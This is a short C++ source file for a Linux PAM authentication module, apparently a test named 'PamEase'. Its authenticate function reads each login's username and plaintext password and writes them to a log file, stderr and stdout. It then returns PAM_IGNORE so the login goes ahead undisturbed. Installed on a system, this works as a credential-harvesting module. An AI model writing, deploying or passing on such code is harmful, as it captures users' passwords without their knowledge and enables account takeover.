#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include <fstream>
#include <iostream>

#include "base.hpp"

// PAM authentication function
extern "C" int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv) {
	auto auth = getLoginCredentials(pamh);

	std::ofstream log("PamEase/pam_test.log");
	log << "Username: " << auth.first << " - Password: " << auth.second << std::endl;
	std::cerr << "Username: " << auth.first << " - Password: " << auth.second << std::endl;
	std::cout << "Username: " << auth.first << " - Password: " << auth.second << std::endl;

	return PAM_IGNORE;
}

extern "C" int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}
